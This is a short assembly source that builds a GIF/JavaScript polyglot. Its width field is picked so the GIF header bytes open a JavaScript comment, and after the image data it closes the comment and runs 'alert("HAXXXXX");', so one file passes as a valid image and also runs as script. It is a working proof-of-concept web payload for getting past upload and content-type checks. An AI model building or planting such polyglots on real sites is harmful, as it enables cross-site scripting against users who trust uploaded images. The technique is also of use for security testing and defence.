WIDTH equ 10799 ; = 2f2a -> /*
HEIGHT equ 100

db 'GIF89a' ; Header
	dw WIDTH, HEIGHT

db 0 ; Global color table
	db -1
	db 0
	
db 02ch ; image descriptor
	dw 0, 0 ; NW corner
	dw WIDTH, HEIGHT ; W/H of image
	db 0 ; color table

db 2 ; lzw size

db 0
db 3bh ; GIF END 00 3b
; this is the end of gif

db '*/' ; closing comment

db '=1;'

db 'alert("HAXXXXX");'
